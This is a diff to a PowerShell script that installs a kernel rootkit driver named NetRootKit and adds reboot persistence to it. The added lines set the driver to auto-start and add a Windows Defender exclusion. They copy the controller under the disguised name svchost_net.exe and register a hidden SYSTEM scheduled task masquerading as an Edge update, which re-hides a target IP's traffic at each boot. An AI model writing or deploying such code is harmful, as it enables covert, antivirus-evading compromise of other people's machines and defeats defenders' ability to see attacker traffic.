@@ -86,7 +86,7 @@ if ($bcd -match "testsigning\s+Yes") {
     exit
 }
 
-# --- 6. Install NetRootKit Driver ---
+# --- 6. Install & Start NetRootKit Driver ---
 Write-Host "[*] Installing NetRootKit Driver via devcon.exe..."
 if (-not (Test-Path "devcon.exe")) {
     Write-Host "[-] devcon.exe not found in current directory! Exiting."
@@ -103,12 +103,15 @@ $devconOutput = .\devcon.exe install NetRootKit.inf Root\NetRootKit
 Write-Host $devconOutput
 
 # IMPORTANT: devcon install registers the service, but it is set to SERVICE_DEMAND_START
-# We must manually start the kernel service so the Controller can get a handle to it.
+# We must configure it to AUTOSTART for reboot persistence, and then start it manually now.
+Write-Host "[*] Configuring the NetRootKit kernel service for AUTO start..."
+sc.exe config NetRootKit start= auto | Out-Null
+
 Write-Host "[*] Starting the NetRootKit kernel service..."
 sc.exe start NetRootKit | Out-Null
 Start-Sleep -Seconds 2
 
-# --- 7. Interact with Kernel Driver to Hide IP ---
+# --- 7. Interact with Kernel Driver & Setup Persistence ---
 Write-Host "[*] Sending hide-remote-ip command to NetRootKitController..."
 if (-not (Test-Path "NetRootKitController.exe")) {
     Write-Host "[-] NetRootKitController.exe not found! Exiting."
@@ -125,4 +128,22 @@ Write-Host "[*] Hiding traffic for IP: $TargetIP"
 $hideOut = .\NetRootKitController.exe hide-remote-ip $TargetIP
 Write-Host $hideOut
 
+Write-Host "[*] Creating Scheduled Task to persist IP hiding across reboots..."
+# Copy the controller somewhere safe where it won't be deleted so the scheduled task can find it
+$PersistDir = "C:\Windows\System32\Tasks\NRK"
+if (-not (Test-Path $PersistDir)) {
+    New-Item -ItemType Directory -Force -Path $PersistDir | Out-Null
+    Add-MpPreference -ExclusionPath $PersistDir -ErrorAction SilentlyContinue
+}
+Copy-Item ".\NetRootKitController.exe" -Destination "$PersistDir\svchost_net.exe" -Force
+
+# Create a scheduled task that runs as SYSTEM on startup to re-apply the IP hiding
+$Action = New-ScheduledTaskAction -Execute "$PersistDir\svchost_net.exe" -Argument "hide-remote-ip $TargetIP"
+$Trigger = New-ScheduledTaskTrigger -AtStartup
+$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
+
+Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineNet" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Description "Keeps Edge network components updated." -Force | Out-Null
+
+Write-Host "[+] Reboot Persistence Configured!"
 Write-Host "[+] NetRootKit deployed successfully!"
